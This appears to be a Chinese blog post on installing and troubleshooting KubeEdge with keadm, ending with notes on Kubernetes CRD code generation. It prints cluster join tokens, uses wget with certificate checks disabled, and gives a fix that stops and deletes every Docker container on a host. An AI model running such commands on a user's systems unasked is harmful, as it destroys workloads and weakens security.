ObjectSync -n default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 Name: node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 Namespace: default Labels: \u003cnone\u003e Annotations: \u003cnone\u003e API Version: reliablesyncs.kubeedge.io/v1alpha1 Kind: ObjectSync Metadata: Creation Timestamp: 2021-05-26T05:42:07Z Generation: 1 Resource Version: 34833736 Self Link: /apis/reliablesyncs.kubeedge.io/v1alpha1/namespaces/default/objectsyncs/node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 UID: c329514a-784c-4fdf-9261-53bf4dcc18a0 Spec: Object API Version: v1 Object Kind: pods Object Name: testpod Status: Object Resource Version: 34833729 Events: \u003cnone\u003e (base) [root@node1 ~]# ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:5","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Exception scenarios/Corner cases handling CloudCore重启 当Cloudcore正常重新启动或启动时，它将检查ResourceVersion以避免发送旧消息。 在Cloudcore重新启动期间，如果删除某些对象，此时可能会丢失DELETE事件。SyncController将处理此情况。这里需要对象GC机制来确保删除：比较CRD中存储的对象是否存在于K8s中。如果没有，则SyncController将生成并发送一个DELETE事件到边缘，并在ACK接收到时删除CRD中的对象。 EdgeCore 重启 当EdgeCore重新启动或脱机一段时间后，节点消息队列将缓存所有消息，每当该节点恢复联机时，消息将被发送。 当边缘节点脱机时，CloudHub将停止发送消息，直到边缘节点恢复联机才会重试。 EdgeNode 删除 当从云中删除edgenode时，Cloudcore将删除相应的消息队列和存储 ObjectSync CR 垃圾回收 当EdgeNode不在集群中时，应删除EdgeNode的所有ObjectSync CRS。 现在，触发垃圾收集的主要方法有两种：CloudCore的启动和EdgeNode的删除事件。 当CloudCore启动时，它将首先检查是否存在旧的ObjectSync CRS并删除它们。 当CloudCore运行时，EdgeNode被删除的事件将触发垃圾回收。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:6","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"部署安装 Deploying using Keadm ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:8:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Download keadm 下载页面，选择相应版本keadm kubeedge下载链接 kubeedge/keadm-v1.6.2-linux-amd64/keadm/keadm keadm用法 # ./keadm -h +----------------------------------------------------------+ | KEADM | | Easily bootstrap a KubeEdge cluster | | | | Please give us feedback at: | | https://github.com/kubeedge/kubeedge/issues | +----------------------------------------------------------+ Create a cluster with cloud node (which controls the edge node cluster), and edge nodes (where native containerized application, in the form of pods and deployments run), connects to devices. Usage: keadm [command] Examples: +----------------------------------------------------------+ | On the cloud machine: | +----------------------------------------------------------+ | master node (on the cloud)# sudo keadm init | +----------------------------------------------------------+ +----------------------------------------------------------+ | On the edge machine: | +----------------------------------------------------------+ | worker node (at the edge)# sudo keadm join \u003cflags\u003e | +----------------------------------------------------------+ You can then repeat the second step on, as many other machines as you like. Available Commands: debug debug function to help diagnose the cluster gettoken To get the token for edge nodes to join the cluster help Help about any command init Bootstraps cloud component. Checks and install (if required) the pre-requisites. join Bootstraps edge component. Checks and install (if required) the pre-requisites. Execute it on any edge node machine you wish to join reset Teardowns KubeEdge (cloud \u0026 edge) component version Print the version of keadm Flags: -h, --help help for keadm Use \"keadm [command] --help\" for more information about a command. ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:8:1","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Setup Cloud Side (KubeEdge Master Node) By default ports 10000 and 10002 in your cloudcore needs to be accessible for your edge nodes. keadm init will install cloudcore, generate the certs and install the CRDs. It also provides a flag by which a specific version can be set. 在master节点上执行： 采用默认版本参数 # keadm init --advertise-address=\"THE-EXPOSED-IP\"(only work since 1.3 release) keadm init --advertise-address=\"10.7.11.213\" 或者指定版本 keadm init --advertise-address=\"10.7.11.212\" --kubeedge-version=1.6.2 --kube-config=/root/.kube/config Output: Kubernetes version verification passed, KubeEdge installation will start... ... KubeEdge cloudcore is running, For logs visit: /var/log/kubeedge/cloudcore.log 安装打印 指定版本kubeedge-v1.6.2，下载成功 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm init --advertise-address=\"10.7.11.213\" --kubeedge-version=1.6.2 --kube-config=/root/.kube/config Kubernetes version verification passed, KubeEdge installation will start... Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: kubeedge-v1.6.2-linux-amd64.tar.gz in your path checksum failed and do you want to delete this file and try to download again? [y/N]: y I0524 17:09:26.209161 8227 common.go:271] kubeedge-v1.6.2-linux-amd64.tar.gz have been deleted and will try to download again kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: [Run as service] service file already exisits in /etc/kubeedge//cloudcore.service, skip download kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge cloudcore is running, For logs visit: /var/log/kubeedge/cloudcore.log CloudCore started (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ps -ef |grep -i cloudcore root 25669 1 0 17:13 pts/11 00:00:00 /usr/local/bin/cloudcore root 30844 94002 0 17:16 pts/11 00:00:00 grep --color=auto -i cloudcore (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# cloudcore启动日志 ]# cat /var/log/kubeedge/cloudcore.log I0525 10:56:45.064260 34285 server.go:64] Version: v1.6.2 I0525 10:56:45.066622 34285 module.go:34] Module cloudhub registered successfully I0525 10:56:45.083709 34285 module.go:34] Module edgecontroller registered successfully I0525 10:56:45.083792 34285 module.go:34] Module devicecontroller registered successfully I0525 10:56:45.083826 34285 module.go:34] Module synccontroller registered successfully W0525 10:56:45.083850 34285 module.go:37] Module cloudStream is disabled, do not register W0525 10:56:45.083856 34285 module.go:37] Module router is disabled, do not register W0525 10:56:45.083865 34285 module.go:37] Module dynamiccontroller is disabled, do not register I0525 10:56:45.083919 34285 core.go:24] Starting module cloudhub I0525 10:56:45.083946 34285 core.go:24] Starting module edgecontroller I0525 10:56:45.083975 34285 core.go:24] Starting module devicecontroller I0525 10:56:45.084029 34285 core.go:24] Starting module synccontroller I0525 10:56:45.084033 34285 upstream.go:110] start upstream controller I0525 10:56:45.084694 34285 downstream.go","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:8:2","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Setup Edge Side (KubeEdge Worker Node) Get Token From Cloud Side Run keadm gettoken in cloud side will return the token, which will be used when joining edge nodes. 在cloud节点生成token，并记录，后面edge节点用到 #./keadm gettoken # 59886279cecd7da202f1d258aad523cf44df78afac68a2766546d97a5ca5e6f9.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5OTc4MDV9._XjeO1GW7gsqfwM4AZ0VuOTIW1FWNAkjOTlirBByV3g keadm gettoken # 27a37ef16159f7d3be8fae95d588b79b3adaaf92727b72659eb89758c66ffda2.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1OTAyMTYwNzd9.JBj8LLYWXwbbvHKffJBpPd5CyxqapRQYDIXtFZErgYE Join Edge Node keadm join will install edgecore and mqtt. It also provides a flag by which a specific version can be set. Example: # keadm join --cloudcore-ipport=192.168.20.50:10000 --token=27a37ef16159f7d3be8fae95d588b79b3adaaf92727b72659eb89758c66ffda2.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1OTAyMTYwNzd9.JBj8LLYWXwbbvHKffJBpPd5CyxqapRQYDIXtFZErgYE # IMPORTANT NOTE: 1. --cloudcore-ipport flag is a mandatory flag. 1. If you want to apply certificate for edge node automatically, --token is needed. 1. The kubeEdge version used in cloud and edge side should be same. keadm join --cloudcore-ipport=10.7.11.212:10000 --kubeedge-version=1.6.2 --token=59886279cecd7da202f1d258aad523cf44df78afac68a2766546d97a5ca5e6f9.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5OTc4MDV9._XjeO1GW7gsqfwM4AZ0VuOTIW1FWNAkjOTlirBByV3g Output: Host has mosquit+ already installed and running. Hence skipping the installation steps !!! ... KubeEdge edgecore is running, For logs visit: /var/log/kubeedge/edgecore.log 安装过程部分打印 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm gettoken 9ecb7342293641c71fe70ac296e349bf0fce395618cb66c27e0643c3b8c985b5.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5MzQwMzh9.5b8f16RDwRhCnnebz_3oc4yn3CnfXLz3kMl7-tPoRD0 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm join --cloudcore-ipport=10.7.11.213:10000 --token=9ecb7342293641c71fe70ac296e349bf0fce395618cb66c27e0643c3b8c985b5.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjE5MzQwMzh9.5b8f16RDwRhCnnebz_3oc4yn3CnfXLz3kMl7-tPoRD0 install MQTT service successfully. Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it. kubeedge-v1.6.2-linux-amd64.tar.gz checksum: checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content: kubeedge-v1.6.2-linux-amd64.tar.gz in your path checksum failed and do you want to delete this file and try to download again? [y/N]: N W0524 17:35:22.099204 64615 common.go:276] failed to checksum and will continue to install. [Run as service] start to download service file for edgecore [Run as service] success to download service file for edgecore kubeedge-v1.6.2-linux-amd64/ kubeedge-v1.6.2-linux-amd64/edge/ kubeedge-v1.6.2-linux-amd64/edge/edgecore kubeedge-v1.6.2-linux-amd64/cloud/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/ kubeedge-v1.6.2-linux-amd64/cloud/csidriver/csidriver kubeedge-v1.6.2-linux-amd64/cloud/admission/ kubeedge-v1.6.2-linux-amd64/cloud/admission/admission kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/ kubeedge-v1.6.2-linux-amd64/cloud/cloudcore/cloudcore kubeedge-v1.6.2-linux-amd64/version KubeEdge edgecore is running, For logs visit: journalctl -u edgecore.service -b (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# # edgecore.service的下载和加载目录位置 (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# (base) [root@node2 /home/wangb/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# find / -name edgecore.service /etc/systemd/system/multi-user.target.wants/edgecore.service /etc/systemd/system/edgecore.service /etc/kubeedge/edgecore.service (base) [r","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:8:3","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"节点信息 node2是新加入集群的edge节点 # kubectl get no NAME STATUS ROLES AGE VERSION node1 Ready master 249d v0.0.0-master+4d3c9e0c node2 Ready agent,edge 2m5s v1.19.3-kubeedge-v1.6.2 Name: node2 Roles: agent,edge Labels: kubernetes.io/arch=amd64 kubernetes.io/hostname=node2 kubernetes.io/os=linux node-role.kubernetes.io/agent= node-role.kubernetes.io/edge= Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Tue, 25 May 2021 12:41:04 +0800 Taints: \u003cnone\u003e Unschedulable: false Lease: HolderIdentity: \u003cunset\u003e AcquireTime: \u003cunset\u003e RenewTime: \u003cunset\u003e Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- Ready True Tue, 25 May 2021 14:00:19 +0800 Tue, 25 May 2021 14:00:19 +0800 EdgeReady edge is posting ready status Addresses: InternalIP: 10.7.11.213 Hostname: node2 Capacity: cpu: 32 memory: 31650Mi pods: 110 Allocatable: cpu: 32 memory: 31550Mi pods: 110 System Info: Machine ID: System UUID: Boot ID: Kernel Version: 3.10.0-1062.12.1.el7.x86_64 OS Image: CentOS Linux 7 (Core) Operating System: linux Architecture: amd64 Container Runtime Version: docker://19.3.13 Kubelet Version: v1.19.3-kubeedge-v1.6.2 Kube-Proxy Version: PodCIDR: 10.233.65.0/24 PodCIDRs: 10.233.65.0/24 Non-terminated Pods: (3 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits AGE --------- ---- ------------ ---------- --------------- ------------- --- default testpod 500m (1%) 500m (1%) 0 (0%) 0 (0%) 50s kube-system calico-node-df9bf 150m (0%) 300m (0%) 64M (0%) 500M (1%) 71m kube-system nodelocaldns-ldj7t 100m (0%) 0 (0%) 70Mi (0%) 170Mi (0%) 71m Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) Resource Requests Limits -------- -------- ------ cpu 750m (2%) 800m (2%) memory 137400320 (0%) 678257920 (2%) ephemeral-storage 0 (0%) 0 (0%) Events: \u003cnone\u003e ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:9:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"组件进程 root 74050 13.9 0.2 3499776 84608 ? Ssl 18:17 1:04 /usr/local/bin/edgecore root 25669 0.3 0.1 2435444 56532 pts/11 Sl 17:13 0:14 /usr/local/bin/cloudcore # 在edge node上 还运行了mosquitto # ps -ef |grep mosquitto mosquit+ 72032 1 0 May24 ? 00:00:20 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf ## 服务 /usr/lib/systemd/system/mosquitto.service ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:10:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"卸载 keadm reset # mosquitto 是rpm 通过yum安装和删除 yum -y remove mosquitto 会停止服务，删除程序和配置目录文件/etc/kubeedge # ./keadm reset [reset] WARNING: Changes made to this host by 'keadm init' or 'keadm join' will be reverted. [reset] Are you sure you want to proceed? [y/N]: y edgecore is stopped ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:11:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"问题 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:12:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"keadm在线下载失败 (base) [/kubeedge/keadm-v1.6.2-linux-amd64/keadm]# ./keadm init --advertise-address=\"10.7.11.213\" --kubeedge-version=1.6.2 --kube-config=/root/.kube/configKubernetes version verification passed, KubeEdge installation will start...Expected or Default KubeEdge version 1.6.2 is already downloaded and will checksum for it.kubeedge-v1.6.2-linux-amd64.tar.gz checksum:checksum_kubeedge-v1.6.2-linux-amd64.tar.gz.txt content:Expected or Default KubeEdge version 1.6.2 is already downloaded[Run as service] start to download service file for cloudcoreError:fail to download service file,error:{failed to exec 'bash -c cd /etc/kubeedge/ \u0026\u0026 sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service', err: --2021-05-24 16:45:02-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.Unable to establish SSL connection.Converted 0 files in 0 seconds., err:exit status 4}Usage:keadm init [flags]Examples:keadm init- This command will download and install the default version of KubeEdge cloud componentkeadm init --kubeedge-version=1.5.0 --kube-config=/root/.kube/config- kube-config is the absolute path of kubeconfig which used to secure connectivity between cloudcore and kube-apiserverFlags:--advertise-address string Use this key to set IPs in cloudcore's certificate SubAltNames field. eg:10.10.102.78,10.10.102.79--domainname string Use this key to set domain names in cloudcore's certificate SubAltNames field. eg:www.cloudcore.cn,www.kubeedge.cn-h, --help help for init--kube-config string Use this key to set kube-config path, eg:$HOME/.kube/config (default \"/root/.kube/config\")--kubeedge-version string Use this key to download and use the required KubeEdge version--master string Use this key to set K8s master address, eg:http://127.0.0.1:8080--tarballpath string Use this key to set the temp directory path for KubeEdge tarball, if not exist, download itF0524 16:46:02.638767 68936 keadm.go:27] fail to download service file,error:{failed to exec 'bash -c cd /etc/kubeedge/ \u0026\u0026 sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service', err: --2021-05-24 16:45:02-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.Unable to establish SSL connection.Converted 0 files in 0 seconds. 进入默认下载目录/etc/kubeedge下， 采用手动方式下载cloudcore.service文件，解决 (base) [root@node2 /tmp]#(base) [root@node2 /tmp]# cd /etc/kubeedge/(base) [root@node2 /etc/kubeedge]# lltotal 49200drwxr-xr-x. 5 root root 72 May 24 16:13 crds-rw-r--r--. 1 root root 50379289 Mar 22 10:07 kubeedge-v1.6.2-linux-amd64.tar.gz(base) [root@node2 /etc/kubeedge]# sudo -E wget -t 5 -k --no-check-certificate https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.service--2021-05-24 17:05:11-- https://raw.githubusercontent.com/kubeedge/kubeedge/release-1.6/build/tools/cloudcore.serviceResolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength:162[text/plain]Saving to:‘cloudcore.service’100%[=========================================================================================================================\u003e] 162 --.-K/s in 0s2021-05-24 17:05:11(3.17 MB/s) - ‘cloudcore.service’ saved [1","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:12:1","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"edgecore失败-Failed to check the running environment edgecore 进行运行环境检查，Kubelet 不能运行在edge ay 24 17:39:59 node2 edgecore[89260]: INFO: Install client plugin, protocol: rest May 24 17:39:59 node2 edgecore[89260]: INFO: Installed service discovery plugin: edge May 24 17:39:59 node2 edgecore[89260]: I0524 17:39:59.286453 89260 server.go:72] Version: v1.6.2 May 24 17:39:59 node2 edgecore[89260]: F0524 17:39:59.321896 89260 server.go:79] Failed to check the running environment: Kubelet should not running on edge May 24 17:39:59 node2 edgecore[89260]: goroutine 1 [running]: May 24 17:39:59 node2 edgecore[89260]: k8s.io/klog/v2.stacks(0xc000128001, 0xc0003622d0, 0x93, 0xe6) 可以通过设置环境变量 CHECK_EDGECORE_ENVIRONMENT=false，使得edgecore不做运行环境检查 vi /etc/systemd/system/edgecore.service /etc/systemd/system/edgecore.service [Unit]Description=edgecore.service[Service]Type=simpleExecStart=/usr/local/bin/edgecoreEnvironment=\"CHECK_EDGECORE_ENVIRONMENT=false\"Restart=alwaysRestartSec=10[Install]WantedBy=multi-user.target systemctl daemon-reload systemctl restart edgecore ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:12:2","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"edgecore失败-Failed to start container manager May 25 12:16:05 node2 edgecore: W0525 12:16:05.217771 103976 proxy.go:64] [EdgeMesh] add route err: file exists May 25 12:16:05 node2 edgecore: I0525 12:16:05.254379 103976 client.go:86] parsed scheme: \"unix\" May 25 12:16:05 node2 edgecore: I0525 12:16:05.254423 103976 client.go:86] scheme \"unix\" not registered, fallback to default scheme May 25 12:16:05 node2 edgecore: I0525 12:16:05.254470 103976 passthrough.go:48] ccResolverWrapper: sending update to cc: {[{unix:///run/containerd/containerd.sock \u003cnil\u003e 0 \u003cnil\u003e}] \u003cnil\u003e \u003cnil\u003e} May 25 12:16:05 node2 edgecore: I0525 12:16:05.254496 103976 clientconn.go:948] ClientConn switching balancer to \"pick_first\" May 25 12:16:06 node2 edgecore: E0525 12:16:06.238991 103976 edged.go:742] Failed to start container manager, err: failed to build map of initial containers from runtime: no PodsandBox found with Id 'acb4ba296812113c10acd0d7ea1f048328950ff77d36be515b3e15ba3d67ba72' May 25 12:16:06 node2 edgecore: E0525 12:16:06.239012 103976 edged.go:293] initialize module error: failed to build map of initial containers from runtime: no PodsandBox found with Id 'acb4ba296812113c10acd0d7ea1f048328950ff77d36be515b3e15ba3d67ba72' May 25 12:16:06 node2 systemd: edgecore.service: main process exited, code=exited, status=1/FAILURE May 25 12:16:06 node2 systemd: Unit edgecore.service entered failed state. May 25 12:16:06 node2 systemd: edgecore.service failed. 检查edgecore的配置文件的edgecore.yaml的参数podSandboxImage 是否正确 podSandboxImage:kubeedge/pause:3.1 清理掉环境中已有pod的容器 # 停用并删除全部容器 docker stop $(docker ps -q) \u0026 docker rm $(docker ps -aq) ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:12:3","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"参考资料 kubeedge-k8s-based-edge-intro kubeedge Documentation kubeedge SourceCode Kubernetes：在边缘计算领域的发展和KubeEdge介绍 kubeedge实现原理 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:13:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"介绍K8S使用CRD进行开发的操作步骤。 ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:0:0","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"CRD中的generate-client-codes 在使用CustomResources时通常会使用以下几个code-generators: deepcopy-gen—creates a method func (t* T) DeepCopy() *T for each type T client-gen—creates typed clientsets for CustomResource APIGroups informer-gen—creates informers for CustomResources which offer an event based interface to react on changes of CustomResources on the server lister-gen—creates listers for CustomResources which offer a read-only caching layer for GET and LIST requests. ","date":"2021-05-04","objectID":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/:1:0","tags":["K8S"],"title":"K8S中的CRD开发","uri":"/posts/2021/05/k8s%E4%B8%AD%E7%9A%84crd%E5%BC%80%E5%8F%91/"},{"categories":["K8S"],"content":"代码生成器codegen 所有Kubernetes代码生成器都是在k8s.io/gengo之上实现的。它们共享许多公共命令行flag。基本上，所有的生成器都会得到一个输入包的列表(–input-dis)，它们逐个type遍历这些包，并输出生成的代码。 关于生成的代码： 或者转到与输入文件相同的目录中，比如inepCopy-gen(带有–输出文件基“zz_generated.deepcopy”来定义文件名)。 或者，它们生成一个或多个输出包(带有–output-package)，比如client-, informer- and lister-gen (通常生成在pkg/client目录下)。 k8s.io/code-generator提供了一个shell脚本generator-group.sh，用于调用生成器及其对CustomResources用例的所有特殊的小需求。在自己的项目中要做的全部工作归结为一个一行程序脚本命令，具体执行代码通常位于hack/update-codegen.sh内。 vendor/k8s.io/code-generator/generate-groups.sh all \\ github.com/xxx_project/crd-code-generation/pkg/client \\ github.com/xxx_project/crd-code-generation/pkg/apis \\ example.com:v1 所有的API都在pkg/api下面，clientsets, informers, and listers都是在pkg/client内部创建的。也就是说，pkg/client是完全自动生成的，与包含CustomResourcegolang类型的Typees.go文件旁边的ZZ_generated.deepcopy.go文件一样，都是完全生成的。这两者都不应该手动修改，而是通过运行 hack/update-codegen.sh # 或者 hack/update-gencode.sh 通常，在update-codegen.sh文件旁边还有一个hack/version-codegen.sh或hack/verify-gencode.sh脚本，如果生成的任何文件都不是最新的，它将以非零返回代码终止。这在CI脚本中非常有用：如果开发人员意外地修改了文件，或者文件只是过时了，CI会注意到并提示。 